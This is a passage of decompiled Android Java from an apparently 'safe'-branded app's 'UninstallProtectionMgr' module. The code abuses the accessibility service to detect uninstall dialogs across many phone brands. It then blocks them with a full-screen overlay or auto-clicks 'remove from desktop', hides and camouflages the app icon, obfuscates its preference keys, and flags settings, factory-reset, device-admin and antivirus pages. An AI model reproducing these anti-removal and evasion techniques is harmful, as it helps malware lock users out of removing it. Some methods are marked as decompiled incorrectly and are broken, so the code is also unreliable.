"com.google.android.apps.nexuslauncher:id/message", "com.google.android.apps.nexuslauncher:id/dialog_title", "com.google.android.apps.nexuslauncher:id/dialog_content", "com.android.launcher3:id/alertTitle", "com.android.launcher3:id/message", "com.android.launcher3:id/txt_uninstall_main_title", "com.android.launcher3:id/txt_uninstall_sub_title", "com.android.launcher3:id/dialog_title", "com.android.launcher3:id/dialog_content", "com.android.launcher2:id/alertTitle", "com.android.launcher2:id/message"}), new Pair("blackshark", new String[]{"com.blackshark.launcher:id/alertTitle", "com.blackshark.launcher:id/message", "com.blackshark.launcher:id/dialog_title", "com.blackshark.launcher:id/dialog_content"}), new Pair("lenovo", new String[]{"com.lenovo.launcher:id/alertTitle", "com.lenovo.launcher:id/message", "com.lenovo.launcher2:id/alertTitle", "com.lenovo.launcher2:id/message"}), new Pair("transsion", new String[]{"com.transsion.launcher:id/alertTitle", "com.transsion.launcher:id/message", "com.infinix.launcher:id/alertTitle", "com.infinix.launcher:id/message", "com.tecno.launcher:id/alertTitle", "com.tecno.launcher:id/message", "com.itel.launcher:id/alertTitle", "com.itel.launcher:id/message"}), new Pair("zte", new String[]{"com.zte.mifavor.launcher:id/alertTitle", "com.zte.mifavor.launcher:id/message"}), new Pair("motorola", new String[]{"com.motorola.launcher3:id/alertTitle", "com.motorola.launcher3:id/message"}), new Pair("lg", new String[]{"com.lge.launcher2:id/alertTitle", "com.lge.launcher2:id/message", "com.lge.launcher3:id/alertTitle", "com.lge.launcher3:id/message"}), new Pair("nothing", new String[]{"com.nothing.launcher:id/alertTitle", "com.nothing.launcher:id/message"}), new Pair("asus", new String[]{"com.asus.launcher:id/alertTitle", "com.asus.launcher:id/message", "com.asus.zenui.launcher:id/alertTitle", "com.asus.zenui.launcher:id/message"}), new Pair("nubia", new String[]{"cn.nubia.launcher:id/alertTitle", "cn.nubia.launcher:id/message"}), new Pair("smartisan", new String[]{"com.smartisanos.launcher:id/alertTitle", "com.smartisanos.launcher:id/message"}), new Pair("sony", new String[]{"com.sonymobile.home:id/alertTitle", "com.sonymobile.home:id/message", "com.sony.home:id/alertTitle", "com.sony.home:id/message"}), new Pair("nokia", new String[]{"com.evenwell.launcher:id/alertTitle", "com.evenwell.launcher:id/message"}), new Pair("coolpad", new String[]{"com.yulong.android.launcher:id/alertTitle", "com.yulong.android.launcher:id/message"}), new Pair("gionee", new String[]{"com.gionee.launcher:id/alertTitle", "com.gionee.launcher:id/message"}));
        this.f53706e1 = AbstractC0770a1.m213614f9(new Pair("iqoo", "vivo"), new Pair("bbk", "vivo"), new Pair("redmi", "xiaomi"), new Pair("poco", "xiaomi"), new Pair("blackshark", "xiaomi"), new Pair("realme", "oppo"), new Pair("oneplus", "oppo"), new Pair("oplus", "oppo"), new Pair("coloros", "oppo"), new Pair("hihonor", "honor"), new Pair("sec", "samsung"), new Pair("tecno", "transsion"), new Pair("infinix", "transsion"), new Pair("itel", "transsion"));
        this.f53707e2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.kinztpexl$deviceDialogIds$2
            {
                super(0);
            }

            /* JADX WARN: Type inference failed for: r3v2, types: [java.lang.Object, java.util.Map] */
            /* JADX WARN: Type inference failed for: r5v0, types: [java.lang.Object, java.util.Map] */
            @Override // p000.w00
            public final Object invoke() {
                String lowerCase5;
                String str5 = Build.BRAND;
                String lowerCase6 = "";
                if (str5 != null) {
                    lowerCase5 = str5.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase5, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                } else {
                    lowerCase5 = "";
                }
                String str6 = Build.MANUFACTURER;
                if (str6 != null) {
                    lowerCase6 = str6.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase6, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                ArrayList arrayList = new ArrayList();
                C0355a0 c0355a0 = this.f53733a0;
                String[] strArr = c0355a0.f53704d9;
                ?? r5 = c0355a0.f53705e0;
                AbstractC0721jk.m213315h3(arrayList, strArr);
                LinkedHashSet linkedHashSet = new LinkedHashSet();
                for (String str7 : r5.keySet()) {
                    if (AbstractC0779a1.m213652a5(lowerCase5, str7, false) || AbstractC0779a1.m213652a5(lowerCase6, str7, false)) {
                        linkedHashSet.add(str7);
                    }
                }
                for (Map.Entry entry : c0355a0.f53706e1.entrySet()) {
                    String str8 = (String) entry.getKey();
                    String str9 = (String) entry.getValue();
                    if (AbstractC0779a1.m213652a5(lowerCase5, str8, false) || AbstractC0779a1.m213652a5(lowerCase6, str8, false)) {
                        linkedHashSet.add(str9);
                    }
                }
                Iterator it = linkedHashSet.iterator();
                while (it.hasNext()) {
                    String[] strArr2 = (String[]) r5.get((String) it.next());
                    if (strArr2 != null) {
                        AbstractC0721jk.m213315h3(arrayList, strArr2);
                    }
                }
                if (linkedHashSet.isEmpty()) {
                    AbstractC0721jk.m213315h3(arrayList, new String[]{"com.android.launcher:id/alertTitle", "com.android.launcher:id/message", "com.android.launcher:id/txt_uninstall_main_title", "com.android.launcher:id/txt_uninstall_sub_title", "com.android.launcher3:id/alertTitle", "com.android.launcher3:id/message"});
                }
                String[] strArr3 = (String[]) AbstractC0715je.m213288h5(arrayList).toArray(new String[0]);
                int length = strArr3.length;
                StringBuilder sbM41c2 = AbstractC0003a2.m41c2("🛡️ [ViewId] brand=", lowerCase5, " manufacturer=", lowerCase6, " 匹配品牌=");
                sbM41c2.append(linkedHashSet);
                sbM41c2.append(" 加载");
                sbM41c2.append(length);
                sbM41c2.append("个ID");
                t60.m214702c3("UninstallProtectionMgr", sbM41c2.toString());
                return strArr3;
            }
        });
        this.f53708e3 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.protection.kinztpexl$cachedUninstallDialogViewIds$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                List list = gb1.f56435a0;
                ArrayList arrayList = new ArrayList();
                arrayList.addAll(gb1.f56435a0);
                String str5 = this.f53732a0.f53678b3;
                if (AbstractC0779a1.m213652a5(str5, "xiaomi", false) || AbstractC0779a1.m213652a5(str5, "redmi", false) || AbstractC0779a1.m213652a5(str5, "poco", false) || AbstractC0779a1.m213652a5(str5, "blackshark", false)) {
                    arrayList.addAll(gb1.f56436a1);
                    return arrayList;
                }
                if (AbstractC0779a1.m213652a5(str5, "oppo", false) || AbstractC0779a1.m213652a5(str5, "realme", false) || AbstractC0779a1.m213652a5(str5, "oneplus", false) || AbstractC0779a1.m213652a5(str5, "coloros", false) || AbstractC0779a1.m213652a5(str5, "oplus", false)) {
                    arrayList.addAll(gb1.f56437a2);
                    return arrayList;
                }
                if (AbstractC0779a1.m213652a5(str5, "vivo", false) || AbstractC0779a1.m213652a5(str5, "iqoo", false) || AbstractC0779a1.m213652a5(str5, "bbk", false)) {
                    arrayList.addAll(gb1.f56444a9);
                    return arrayList;
                }
                if (AbstractC0779a1.m213652a5(str5, "honor", false) || AbstractC0779a1.m213652a5(str5, "hihonor", false)) {
                    arrayList.addAll(gb1.f56439a4);
                    return arrayList;
                }
                if (AbstractC0779a1.m213652a5(str5, "huawei", false)) {
                    arrayList.addAll(gb1.f56438a3);
                    return arrayList;
                }
                if (AbstractC0779a1.m213652a5(str5, "samsung", false) || AbstractC0779a1.m213652a5(str5, "sec", false)) {
                    arrayList.addAll(gb1.f56440a5);
                    return arrayList;
                }
                if (AbstractC0779a1.m213652a5(str5, "google", false)) {
                    arrayList.addAll(gb1.f56441a6);
                    return arrayList;
                }
                if (AbstractC0779a1.m213652a5(str5, "meizu", false)) {
                    arrayList.addAll(gb1.f56442a7);
                    return arrayList;
                }
                arrayList.addAll(gb1.f56443a8);
                return arrayList;
            }
        });
        this.f53710e5 = new pk1(this, 3);
        this.f53711e6 = "";
        this.f53713e8 = 2000L;
    }

    /* JADX WARN: Code restructure failed: missing block: B:173:0x0074, code lost:
    
        continue;
     */
    /* JADX WARN: Code restructure failed: missing block: B:70:0x0160, code lost:
    
        r2 = r1.size();
        r3 = 0;
     */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final boolean m211906a0(C0355a0 c0355a0, AccessibilityNodeInfo accessibilityNodeInfo) {
        int size;
        int i;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String string;
        String string2;
        String string3;
        String string4;
        List listM213306g5 = AbstractC0716jf.m213306g5("从桌面移除", "从桌面删除");
        List list = dh0.f55755a5;
        ArrayList arrayList = new ArrayList();
        for (Object obj : list) {
            String str = (String) obj;
            if (!t60.m214686a2(str, "从桌面移除") && !t60.m214686a2(str, "从桌面删除")) {
                arrayList.add(obj);
            }
        }
        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(listM213306g5, arrayList);
        try {
            String[] strArr = {"com.hihonor.android.launcher:id/btn_negative", "com.hihonor.android.launcher:id/remove_btn", "com.hihonor.android.launcher:id/remove_from_desktop", "com.hihonor.android.launcher:id/delete_item_enhanced", "com.hihonor.android.launcher:id/delete_item", "com.hihonor.home:id/btn_negative", "com.hihonor.home:id/remove_btn", "com.hihonor.home:id/delete_item_enhanced", "com.hihonor.home:id/delete_item", "android:id/button2", "android:id/button_neutral"};
            int i2 = 0;
            while (true) {
                if (i2 >= 11) {
                    break;
                }
                String str2 = strArr[i2];
                try {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str2);
                    if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByViewId) {
                            CharSequence text = accessibilityNodeInfo2.getText();
                            if (text == null || (string4 = text.toString()) == null || (string3 = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                                string3 = "";
                            }
                            if (!arrayListM213298i5.isEmpty()) {
                                int size2 = arrayListM213298i5.size();
                                int i3 = 0;
                                while (true) {
                                    if (i3 < size2) {
                                        Object obj2 = arrayListM213298i5.get(i3);
                                        i3++;
                                        if (AbstractC0779a1.m213652a5(string3, (String) obj2, true)) {
                                            if (!accessibilityNodeInfo2.isVisibleToUser()) {
                                                continue;
                                            } else if (accessibilityNodeInfo2.isClickable()) {
                                                accessibilityNodeInfo2.performAction(16);
                                                t60.m214714d6("UninstallProtectionMgr", "🛡️ [荣耀] ViewId点击按钮: viewId=" + str2 + " text='" + string3 + "'");
                                                Iterator<T> it = listFindAccessibilityNodeInfosByViewId.iterator();
                                                while (it.hasNext()) {
                                                    try {
                                                        ((AccessibilityNodeInfo) it.next()).recycle();
                                                    } catch (Exception unused) {
                                                    }
                                                }
                                            } else {
                                                AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                                                if (parent != null && parent.isClickable()) {
                                                    parent.performAction(16);
                                                    t60.m214714d6("UninstallProtectionMgr", "🛡️ [荣耀] ViewId点击父节点: viewId=" + str2 + " text='" + string3 + "'");
                                                    parent.recycle();
                                                    Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                                                    while (it2.hasNext()) {
                                                        try {
                                                            ((AccessibilityNodeInfo) it2.next()).recycle();
                                                        } catch (Exception unused2) {
                                                        }
                                                    }
                                                } else if (parent != null) {
                                                    parent.recycle();
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        Iterator<T> it3 = listFindAccessibilityNodeInfosByViewId.iterator();
                        while (it3.hasNext()) {
                            try {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            } catch (Exception unused3) {
                            }
                        }
                    }
                } catch (Exception unused4) {
                }
                i2++;
            }
            return true;
        } catch (Exception unused5) {
        }
        while (i < size) {
            Object obj3 = arrayListM213298i5.get(i);
            i++;
            String str3 = (String) obj3;
            try {
                listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str3);
            } catch (Exception unused6) {
            }
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                for (AccessibilityNodeInfo accessibilityNodeInfo3 : listFindAccessibilityNodeInfosByText) {
                    CharSequence text2 = accessibilityNodeInfo3.getText();
                    if (text2 == null || (string2 = text2.toString()) == null || (string = AbstractC0779a1.m213687e0(string2).toString()) == null) {
                        string = "";
                    }
                    if (string.length() <= str3.length() + 4 && accessibilityNodeInfo3.isVisibleToUser()) {
                        if (accessibilityNodeInfo3.isClickable()) {
                            try {
                                accessibilityNodeInfo3.performAction(16);
                                t60.m214714d6("UninstallProtectionMgr", "🛡️ [荣耀] 文本点击按钮: '" + string + "'");
                                Iterator<T> it4 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it4.hasNext()) {
                                    try {
                                        ((AccessibilityNodeInfo) it4.next()).recycle();
                                    } catch (Exception unused7) {
                                    }
                                }
                            } catch (Exception unused8) {
                                continue;
                            }
                        } else {
                            AccessibilityNodeInfo parent2 = accessibilityNodeInfo3.getParent();
                            if (parent2 != null && parent2.isClickable()) {
                                parent2.performAction(16);
                                t60.m214714d6("UninstallProtectionMgr", "🛡️ [荣耀] 文本点击父节点: '" + string + "'");
                                parent2.recycle();
                                Iterator<T> it5 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it5.hasNext()) {
                                    try {
                                        ((AccessibilityNodeInfo) it5.next()).recycle();
                                    } catch (Exception unused9) {
                                    }
                                }
                            } else if (parent2 != null) {
                                parent2.recycle();
                            }
                        }
                        return true;
                    }
                }
                Iterator<T> it6 = listFindAccessibilityNodeInfosByText.iterator();
                while (it6.hasNext()) {
                    try {
                        ((AccessibilityNodeInfo) it6.next()).recycle();
                    } catch (Exception unused10) {
                    }
                }
            }
        }
        return false;
        return false;
    }

    /* renamed from: a2 */
    public static final void m211908a2(C0355a0 c0355a0, AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        String string;
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (jCurrentTimeMillis - c0355a0.f53670a5 < 0 || c0355a0.f53675b0.get() || c0355a0.f53673a8) {
            return;
        }
        CharSequence packageName = accessibilityNodeInfo.getPackageName();
        if (packageName == null || (string = packageName.toString()) == null) {
            lowerCase = "";
        } else {
            lowerCase = string.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        if ((AbstractC0779a1.m213652a5(lowerCase, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase, "home", false) || AbstractC0779a1.m213652a5(lowerCase, "hiboard", false) || lowerCase.equals("com.miui.home") || m211932d5(lowerCase)) && !m211931d4(accessibilityNodeInfo)) {
            if (!c0355a0.m211935b8(accessibilityNodeInfo)) {
                if (c0355a0.f53671a6) {
                    t60.m214702c3("UninstallProtectionMgr", "🛡️ [桌面卸载] 正在监控但未检测到对话框ViewId pkg=".concat(lowerCase));
                    return;
                }
                return;
            }
            if (c0355a0.f53679b4 && c0355a0.f53674a9) {
                String[] strArr = {"卸载", "从桌面移除", "Uninstall"};
                for (int i = 0; i < 3; i++) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(strArr[i]);
                    boolean z = listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty();
                    if (listFindAccessibilityNodeInfosByText != null) {
                        Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                        while (it.hasNext()) {
                            try {
                                ((AccessibilityNodeInfo) it.next()).recycle();
                            } catch (Exception unused) {
                            }
                        }
                    }
                    if (!z) {
                        c0355a0.f53670a5 = jCurrentTimeMillis;
                        t60.m214714d6("UninstallProtectionMgr", "🛡️ [桌面卸载][荣耀] 已确认我们的图标，检测到卸载菜单 → 盖遮挡层");
                        c0355a0.f53676b1.postAtFrontOfQueue(new nk1(c0355a0, 5));
                        c0355a0.m211945d9("DESKTOP_UNINSTALL", "桌面卸载检测(荣耀)", AbstractC1117qo.m214451e7("honor_app"), "全屏遮挡", null);
                        c0355a0.f53671a6 = false;
                        return;
                    }
                }
            }
            List listM211940c6 = c0355a0.m211940c6();
            ArrayList arrayList = new ArrayList();
            for (Object obj : listM211940c6) {
                if (!AbstractC0779a1.m213663b6((String) obj)) {
                    arrayList.add(obj);
                }
            }
            String strM211941c7 = c0355a0.m211941c7(accessibilityNodeInfo, arrayList);
            String str = strM211941c7 != null ? "ViewId" : "";
            if (strM211941c7 == null) {
                int size = arrayList.size();
                int i2 = 0;
                loop3: while (true) {
                    if (i2 >= size) {
                        break;
                    }
                    Object obj2 = arrayList.get(i2);
                    i2++;
                    String str2 = (String) obj2;
                    String string2 = AbstractC0779a1.m213687e0(str2).toString();
                    if (string2.length() >= 2) {
                        try {
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(string2);
                            if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                try {
                                    Iterator<T> it2 = listFindAccessibilityNodeInfosByText2.iterator();
                                    while (it2.hasNext()) {
                                        try {
                                            ((AccessibilityNodeInfo) it2.next()).recycle();
                                        } catch (Exception unused2) {
                                        }
                                    }
                                    strM211941c7 = str2;
                                    break loop3;
                                } catch (Exception unused3) {
                                    strM211941c7 = str2;
                                }
                            }
                        } catch (Exception unused4) {
                            continue;
                        }
                    }
                }
                if (strM211941c7 != null) {
                    if (c0355a0.f53674a9) {
                        str = "Text+Confirmed";
                    } else if (m211928d1(accessibilityNodeInfo, strM211941c7)) {
                        str = "Text+Context";
                    } else {
                        t60.m214702c3("UninstallProtectionMgr", "🛡️ [桌面卸载] 文字搜索匹配到'" + strM211941c7 + "'但不在卸载上下文中，跳过防误判");
                        strM211941c7 = null;
                    }
                }
            }
            if (strM211941c7 == null) {
                return;
            }
            c0355a0.f53670a5 = jCurrentTimeMillis;
            t60.m214726f4("UninstallProtectionMgr", "🛡️ [桌面卸载][" + str + "] 检测到: " + strM211941c7);
            t60.m214714d6("UninstallProtectionMgr", "🛡️ [桌面卸载] → 全屏遮挡");
            c0355a0.f53676b1.postAtFrontOfQueue(new nk1(c0355a0, 6));
            c0355a0.m211945d9("DESKTOP_UNINSTALL", "桌面卸载检测→全屏遮挡", AbstractC1117qo.m214451e7(strM211941c7), "全屏遮挡", null);
            c0355a0.f53671a6 = false;
        }
    }

    /* renamed from: b7 */
    public static final void m211923b7(C0355a0 c0355a0) {
        try {
            C0328b3 c0328b3 = c0355a0.f53692c7;
            if (c0328b3 == null) {
                t60.m214704c5("UninstallProtectionMgr", "❌ appIconHideManager 为 null，无法隐藏");
                return;
            }
            C0356a1.f53714b2.setHidingFromRecents(true);
            t60.m214702c3("UninstallProtectionMgr", "🎭 开始执行隐藏... (forceHide=true)");
            w00 w00Var = c0355a0.f53699d4;
            if (w00Var != null) {
                w00Var.invoke();
            }
            try {
                yj1 yj1VarM211758a2 = c0328b3.m211758a2(true);
                t60.m214702c3("UninstallProtectionMgr", "🎭 hideAppIcon() 调用完成: success=" + yj1VarM211758a2.f61327a0 + ", method=" + yj1VarM211758a2.f61328a1);
                c0355a0.f53665a0.getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).edit().putBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), true).apply();
                c0355a0.f53665a0.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
            } catch (Exception e) {
                t60.m214705c6("UninstallProtectionMgr", "❌ hideAppIcon() 异常: " + e.getMessage(), e);
            }
        } catch (Exception e2) {
            tz0.m214808a8("❌ triggerCamouflageUnified 异常: ", e2.getMessage(), "UninstallProtectionMgr", e2);
        }
    }

    /* renamed from: b9 */
    public static void m211924b9(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        String string3;
        String string4;
        if (i > 15 || arrayList.size() > 80) {
            return;
        }
        try {
            if (accessibilityNodeInfo.isVisibleToUser()) {
                CharSequence text = accessibilityNodeInfo.getText();
                if (text != null && (string3 = text.toString()) != null && (string4 = AbstractC0779a1.m213687e0(string3).toString()) != null && !AbstractC0779a1.m213663b6(string4) && string4.length() < 100) {
                    arrayList.add(string4);
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string = contentDescription.toString()) != null && (string2 = AbstractC0779a1.m213687e0(string).toString()) != null && !AbstractC0779a1.m213663b6(string2) && string2.length() < 100 && !arrayList.contains(string2)) {
                    arrayList.add(string2);
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount && arrayList.size() <= 80; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    try {
                        m211924b9(i + 1, child, arrayList);
                        try {
                            child.recycle();
                        } catch (Exception unused) {
                        }
                    } catch (Throwable th) {
                        try {
                            child.recycle();
                        } catch (Exception unused2) {
                        }
                        throw th;
                    }
                }
            }
        } catch (Exception unused3) {
        }
    }

    /* renamed from: c4 */
    public static void m211925c4(C0355a0 c0355a0) {
        AtomicBoolean atomicBoolean = c0355a0.f53675b0;
        if (atomicBoolean.compareAndSet(false, true)) {
            try {
                new Thread(new nk1(c0355a0, 8)).start();
            } catch (Exception e) {
                t60.m214705c6("UninstallProtectionMgr", "❌ 无法启动返回线程，复位状态", e);
                atomicBoolean.set(false);
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:23:0x0048 A[Catch: Exception -> 0x0055, LOOP:1: B:21:0x0042->B:23:0x0048, LOOP_END, TRY_LEAVE, TryCatch #0 {Exception -> 0x0055, blocks: (B:3:0x0001, B:4:0x0005, B:6:0x000b, B:8:0x0017, B:11:0x001e, B:20:0x003e, B:21:0x0042, B:23:0x0048, B:14:0x0027, B:15:0x002b, B:17:0x0031), top: B:29:0x0001 }] */
    /* JADX WARN: Removed duplicated region for block: B:35:0x0054 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:38:0x0005 A[SYNTHETIC] */
    /* renamed from: c5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m211926c5(AccessibilityNodeInfo accessibilityNodeInfo, List list) {
        boolean z;
        Iterator<T> it;
        try {
            Iterator it2 = list.iterator();
            while (it2.hasNext()) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((String) it2.next());
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                        z = false;
                        it = listFindAccessibilityNodeInfosByViewId.iterator();
                        while (it.hasNext()) {
                            ((AccessibilityNodeInfo) it.next()).recycle();
                        }
                        if (!z) {
                            return true;
                        }
                    } else {
                        Iterator<T> it3 = listFindAccessibilityNodeInfosByViewId.iterator();
                        while (it3.hasNext()) {
                            if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                                z = true;
                                break;
                            }
                        }
                        z = false;
                        it = listFindAccessibilityNodeInfosByViewId.iterator();
                        while (it.hasNext()) {
                        }
                        if (!z) {
                        }
                    }
                }
            }
        } catch (Exception unused) {
        }
        return false;
    }

    /* renamed from: d0 */
    public static boolean m211927d0(String str) {
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        if (!AbstractC0779a1.m213652a5(lowerCase, "reset", false) && !AbstractC0779a1.m213652a5(lowerCase, "factory", false) && !AbstractC0779a1.m213652a5(lowerCase, "backup", false) && !AbstractC0779a1.m213652a5(lowerCase, "privacy", false) && !AbstractC0779a1.m213652a5(lowerCase, StringUtil.m212470a0("KloSP14rBSxePSJNCA=="), false) && !AbstractC0779a1.m213652a5(lowerCase, "masterclear", false) && !AbstractC0779a1.m213652a5(lowerCase, "wipe", false) && !AbstractC0779a1.m213652a5(lowerCase, "erase", false) && !AbstractC0779a1.m213652a5(lowerCase, "deviceadmin", false)) {
            if (AbstractC0779a1.m213652a5(lowerCase, "installedappdetails", false) || AbstractC0779a1.m213652a5(lowerCase, "appinfosettings", false) || AbstractC0779a1.m213652a5(lowerCase, "applicationsdetails", false) || AbstractC0779a1.m213652a5(lowerCase, "appdetail", false) || AbstractC0779a1.m213652a5(lowerCase, "applicationinfo", false) || AbstractC0779a1.m213652a5(lowerCase, "appinfoactivity", false) || AbstractC0779a1.m213652a5(lowerCase, "packageinfo", false)) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [应用管理] 应用详情页: ".concat(str));
                return true;
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "manageapplications", false) || AbstractC0779a1.m213652a5(lowerCase, "manageapps", false) || AbstractC0779a1.m213652a5(lowerCase, "apppermissions", false) || AbstractC0779a1.m213652a5(lowerCase, "permissiondetail", false) || AbstractC0779a1.m213652a5(lowerCase, "applist", false) || AbstractC0779a1.m213652a5(lowerCase, "applicationlist", false) || AbstractC0779a1.m213652a5(lowerCase, "allapps", false) || AbstractC0779a1.m213652a5(lowerCase, "installedapps", false) || AbstractC0779a1.m213652a5(lowerCase, "installedapp", false) || AbstractC0779a1.m213652a5(lowerCase, "appmanager", false) || AbstractC0779a1.m213652a5(lowerCase, "applicationsmanager", false) || AbstractC0779a1.m213652a5(lowerCase, "softwaremanager", false) || AbstractC0779a1.m213652a5(lowerCase, "spaceclean", false)) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [应用管理] 应用列表页: ".concat(str));
                return true;
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "startupapp", false) || AbstractC0779a1.m213652a5(lowerCase, "autostart", false) || AbstractC0779a1.m213652a5(lowerCase, "selfstart", false) || AbstractC0779a1.m213652a5(lowerCase, "autostartmanage", false) || AbstractC0779a1.m213652a5(lowerCase, "startupmanage", false)) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [应用管理] 自启动管理: ".concat(str));
                return true;
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "protect", false) || AbstractC0779a1.m213652a5(lowerCase, "appcontrol", false) || AbstractC0779a1.m213652a5(lowerCase, "backgroundapp", false) || AbstractC0779a1.m213652a5(lowerCase, "backgroundmanage", false) || AbstractC0779a1.m213652a5(lowerCase, "runningapp", false) || AbstractC0779a1.m213652a5(lowerCase, "runningservice", false)) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [应用管理] 进程保护: ".concat(str));
                return true;
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "batteryusage", false) || AbstractC0779a1.m213652a5(lowerCase, "powerusage", false) || AbstractC0779a1.m213652a5(lowerCase, "fuelgauge", false) || AbstractC0779a1.m213652a5(lowerCase, "powerrank", false) || AbstractC0779a1.m213652a5(lowerCase, "appbattery", false) || AbstractC0779a1.m213652a5(lowerCase, "powercontrol", false) || AbstractC0779a1.m213652a5(lowerCase, "batterydetail", false) || AbstractC0779a1.m213652a5(lowerCase, "excessivepower", false) || (AbstractC0779a1.m213652a5(lowerCase, "battery", false) && (AbstractC0779a1.m213652a5(lowerCase, "app", false) || AbstractC0779a1.m213652a5(lowerCase, "detail", false)))) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [应用管理] 电池/耗电页: ".concat(str));
                return true;
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "antivirus", false) || AbstractC0779a1.m213652a5(lowerCase, "virus", false) || AbstractC0779a1.m213652a5(lowerCase, "securityscan", false) || AbstractC0779a1.m213652a5(lowerCase, "scanner", false) || AbstractC0779a1.m213652a5(lowerCase, "malware", false) || AbstractC0779a1.m213652a5(lowerCase, "threat", false) || AbstractC0779a1.m213652a5(lowerCase, "securitycenter", false)) {
                t60.m214702c3("UninstallProtectionMgr", "🛡️ [应用管理] 病毒查杀: ".concat(str));
                return true;
            }
        }
        return false;
    }

    /* renamed from: d1 */
    public static boolean m211928d1(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        String string2;
        String string3;
        String[] strArr = {"卸载", "移除", "删除", "Uninstall", "Remove", "Delete"};
        int i = 0;
        loop0: while (true) {
            if (i >= 6) {
                try {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(new String[]{str}[0]);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByText.iterator();
                        while (it.hasNext()) {
                            CharSequence text = it.next().getText();
                            if (text == null || (string = text.toString()) == null) {
                                string = "";
                            }
                            for (int i2 = 0; i2 < 6; i2++) {
                                if (AbstractC0779a1.m213652a5(string, strArr[i2], true)) {
                                    Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                    while (it2.hasNext()) {
                                        try {
                                            ((AccessibilityNodeInfo) it2.next()).recycle();
                                        } catch (Exception unused) {
                                        }
                                    }
                                }
                            }
                        }
                        Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                        while (it3.hasNext()) {
                            try {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            } catch (Exception unused2) {
                            }
                        }
                    }
                } catch (Exception unused3) {
                }
                return false;
            }
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText(strArr[i]);
                if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
